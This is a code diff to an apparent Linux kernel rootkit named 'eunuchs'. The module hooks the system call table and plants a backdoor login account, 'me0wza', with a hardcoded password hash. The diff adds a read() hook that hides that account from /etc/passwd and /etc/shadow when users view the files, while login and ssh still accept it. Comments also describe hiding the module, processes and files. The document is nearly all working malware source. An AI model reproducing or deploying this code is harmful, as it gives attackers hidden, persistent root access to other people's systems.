@@ -8,9 +8,6 @@
  * Linux Kernel Module Programming Guide reference
  * https://www.tldp.org/LDP/lkmpg/2.6/lkmpg.pdf
  *
- * TODO:
- * hide backdoor contents from user
- *
  * Requirements to build:
  *  `sudo apt-get install build-essential linux-headers-($uname -r)`
  *  As root...
@@ -48,7 +45,7 @@
  *
  * All other interaction with this module is done by writing to /dev/.eunuchs.
  * Commands:
- *  ohaiplzshowallhiding            - shows all hidden pids (DEBUG ONLY)
+ *  ohaiplzshowallhiding            - shows all entries in the hidden lists (DEBUG ONLY)
  *  kthxbye                         - hide the LKM from lsmod (NOTE: You can't
  *                                    remove the LKM until after you make it
  *                                    visible again)
@@ -84,7 +81,7 @@ static unsigned long *sct = 0xc167b180;
  *  user -> me0wza
  *  pass -> w0wza
  **/
-#define EUNUCHS_PASSWD_MOD "\nme0wza:x:1000:1000::/:/bin/sh\n"
+#define EUNUCHS_PASSWD_MOD "\nme0wza:x:31337:31337::/:/bin/sh\n"
 #define EUNUCHS_SHADOW_MOD "\nme0wza:$6$ndHcTwCTVHYKicfm$rucI7fX275L7zHK/wQ.olS8tt3xFvhFCut0SdVAQn2Rt9kHTi4K8ftjvImMM.9w2CKW6HgDw/lzzdoh0Vt4d10:18227:0:99999:7:::\n"
 
 #include <linux/init.h>
@@ -104,10 +101,10 @@ static unsigned long *sct = 0xc167b180;
 #include <linux/list.h>         // linked lists
 #include <linux/cred.h>         // credentials, for setuid
 #include <linux/fdtable.h>      // for fcheck_files
+#include <linux/sched.h>        // for task_struct.. for current macro
 
-/* undef this to disable debug messages/functions */
-#define DEBUG 1
-
+/* set this to [1 to enable][0 to disable] debug messages/functions */
+#define DEBUG 0
 #define debug(fmt, ...) \
     if(DEBUG) \
     { \
@@ -158,19 +155,16 @@ static int eunuchs_dev_maj_number;  // major number for device
 
 static int eunuchs_char_open(struct inode *i, struct file *f)
 {
-    /* [> printk("device open()\n"); <] */
     return 0;
 }
 
 static int eunuchs_char_release(struct inode *i, struct file *f)
 {
-    /* [> printk("device release()\n"); <] */
     return 0;
 }
 
 static ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, loff_t *off)
 {
-    /* [> printk("device read()\n"); <] */
     debug("read() got [%s] [%d bytes]\n", buf, len);
     return 0;
 }
@@ -363,11 +357,194 @@ static asmlinkage long eunuchs_setuid(uid_t uid)
 }
 
 /**
- * read() handler
+ * read() handler -
+ *
+ * Here, we check to see if we're trying to read either /etc/passwd or
+ * /etc/shadow. If a process is not trying to read either one of these, just use
+ * the original read function, since we don't need to do anything.
+ *
+ * However, if a process *is* attempting to read one of these, we then need to
+ * determine whether it's a user trying to read the files, or a login-type process.
+ *
+ * If it's a process, we then need to see if it's a login-type process (login,
+ * systemd-logind, gdm, etc) which *SHOULD* have visibility to our account (or
+ * else having that account is useless), or some other command (vim, more, less,
+ * cat, nano, etc). We can determine this by noting that the latter type of
+ * commands have a parent process which is (probably) a shell or terminal, while
+ * the former should be daemons which have a parent process of systemd (init).
+ *
+ * Due to forking and tom-foolery, we count how many parent processes we have
+ * and set a limit there. We set our `amount of parents` threshold to be
+ * a maximum of 2 in order to not strip out contents.
+ *
+ * If we figure that, for example, ssh spawns a child, which in turn spawns a
+ * child, the resulting process hierarchy looks like
+ *    systemd -> sshd -> sshd -> sshd
+ * pstree shows that the last two belong to the same process group, so we get
+ * the group leader, and keep going to each group leader's parent, until we hit
+ * pid 1. If the amount of traversals here is less than our threshold, we do not
+ * strip out the contents, so that we may login to ssh.
+ *
+ * Conversely, most users attemping to read the file by
+ * more/less/cat/vim/nano/etc will have a process hierarchy that looks like
+ *    systemd -> systemd-user -> gnome-terminal -> zsh -> more
+ * all of which belong to different process groups. Since the amount of
+ * traversals to get to init (pid 1) here is higher than we set our threshold,
+ * we should strip this out so that it's not visible.
+ *
+ * This was tested via login with gdm (which works *in theory*, but fails *in
+ * practice* due to the backdoor user's homedir & the permissions therein. You
+ * know it works because it doesn't tell you "wrong password", but starts trying
+ * to launch all the gnome nonsense... But who remotes into a box via gdm,
+ * anyway?), ssh (works fine), and plain ol' login (works fine).
+ * These were tested under both runlevels 5 (graphical) and 3 (console).
  **/
 static asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
 {
-    /* printk("reading..\n"); */
+    struct file *f = NULL;
+    struct path *p = NULL;
+    char *tmp = NULL, *path = NULL;
+    char *snicklefritz = NULL;
+
+    f = fcheck_files(current->files, fd);
+    if(!f)
+    {
+        debug("fcheck_files failed\n");
+        return -ENOENT;
+    }
+
+    p = &f->f_path;
+    path_get(p);
+    tmp = (char *)__get_free_page(GFP_KERNEL);
+    if(!tmp)
+    {
+        debug("__get_free_page failed\n");
+        path_put(p);
+        return -ENOMEM;
+    }
+
+    path = d_path(p, tmp, PAGE_SIZE);
+    path_put(p);
+    if(IS_ERR(path))
+    {
+        free_page((unsigned long)tmp);
+        return PTR_ERR(path);
+    }
+
+    if(!strcmp(path, "/etc/passwd"))
+    {
+        debug("trying to read passwd\n");
+        snicklefritz = kmalloc(sizeof(char) * (strlen(EUNUCHS_PASSWD_MOD) + 1), GFP_KERNEL);
+        if(!snicklefritz)
+        {
+            debug("kmalloc failed\n");
+            goto end;
+        }
+        strcpy(snicklefritz, EUNUCHS_PASSWD_MOD);
+    }
+    else if(!strcmp(path, "/etc/shadow"))
+    {
+        debug("trying to read shadow\n");
+        snicklefritz = kmalloc(sizeof(char) * (strlen(EUNUCHS_SHADOW_MOD) + 1), GFP_KERNEL);
+        if(!snicklefritz)
+        {
+            debug("kmalloc failed\n");
+            goto end;
+        }
+        strcpy(snicklefritz, EUNUCHS_SHADOW_MOD);
+    }
+
+    if(snicklefritz)
+    {
+        struct task_struct *t = NULL;
+        char *new_buf = NULL;
+        int res = 0, depth = 0;
+
+        /* is the parent process init? */
+        debug("current->gl->pid %d\n"
+              "current->gl->rp->pid %d\n"
+              "current->gl->p->pid %d\n"
+              "current->rp->pid %d\n"
+              "current->p->pid %d\n",
+              current->group_leader->pid,
+              current->group_leader->real_parent->pid,
+              current->group_leader->parent->pid,
+              current->real_parent->pid,
+              current->parent->pid);
+
+        /* see how many deep from init we are.. if we're < 3, strip */
+        t = current;
+        while(t->group_leader &&
+              t->group_leader->real_parent &&
+              t->group_leader->real_parent->pid != (pid_t)1)
+        {
+            depth++;
+            t = t->group_leader->real_parent;
+        }
+
+        if(depth < 2)
+        {
+            /* we don't strip out stuff for init */
+            debug("... not stripping, only %d deep in ps tree\n", depth);
+            goto end;
+        }
+
+        debug("... we're %d deep in the ps tree.. strip it out\n", depth);
+
+        /* parent process is NOT init, we need to remove stuff */
+        /* read the file like usual, then strip out what we want */
+        res = orig_read(fd, buf, count);
+
+        /* is the backdoor account in the file contents? */
+        if(strstr(buf, snicklefritz))
+        {
+            debug("... stripping backdoor account from read\n");
+
+            new_buf = kmalloc(sizeof(char) * (res + 1), GFP_KERNEL);
+            if(!new_buf)
+            {
+                debug("kmalloc failed\n");
+                goto end;
+            }
+
+            copy_from_user(new_buf, buf, res);
+            if(!new_buf)
+            {
+                debug("copy_from_user() failed\n");
+                kfree(new_buf);
+                goto end;
+            }
+
+            /* in case somehow there are multiple entries in the file */
+            while(strstr(new_buf, snicklefritz))
+            {
+                char *mark = strstr(new_buf, snicklefritz),
+                     *end = mark + strlen(snicklefritz);
+                int remaining = strlen(end) + 1; // + 1 for null term
+                memmove(mark, end, remaining);
+                res -= strlen(snicklefritz);
+            }
+
+            copy_to_user(buf, new_buf, res);
+
+            if(new_buf)
+                kfree(new_buf);
+        }
+
+        if(snicklefritz)
+            kfree(snicklefritz);
+        if(tmp)
+            free_page((unsigned long)tmp);
+
+        return res;
+    }
+
+end:
+    if(snicklefritz)
+        kfree(snicklefritz);
+    if(tmp)
+        free_page((unsigned long)tmp);
+
     return orig_read(fd, buf, count);
 }
 
@@ -530,7 +707,7 @@ static asmlinkage int eunuchs_fstat64(unsigned long fd, struct stat64 __user *st
 
     if(IS_ERR(path))
     {
-        kfree(tmp);
+        free_page((unsigned long)tmp);
         return PTR_ERR(path);
     }
 
@@ -836,7 +1013,6 @@ static int eunuchs_lists_init(void)
  **/
 static void eunuchs_lists_free(void)
 {
-    /* eunuchs_proc_hide_by_user *ud = NULL, *ud2 = NULL; */
     eunuchs_proc_hide_by_pid *pd = NULL, *pd2 = NULL;
     eunuchs_file_hide_by_ext *fd = NULL, *fd2 = NULL;
 
@@ -969,7 +1145,7 @@ static int eunuchs_install_backdoor(void)
     if(!strnstr(buf, EUNUCHS_SHADOW_MOD, size))
     {
         char *s = EUNUCHS_SHADOW_MOD;
-        
+
         /* again, to avoid inserting a blank line in the file */
         if(buf[size-1] == '\n')
             s++;
@@ -1092,7 +1268,13 @@ static int eunuchs_init(void)
     cr0_disable_write();
 
 
-    /* hide the module */
+    /**
+     * should we hide the module during initialization?
+     *
+     * uncomment the following line to hide the module by default.. more useful
+     * in practice, but then you don't get to experience the joy of echo'ing
+     * kthxbye to the char device.
+     **/
     /* eunuchs_hide_lkm(); */
 
     return 0;
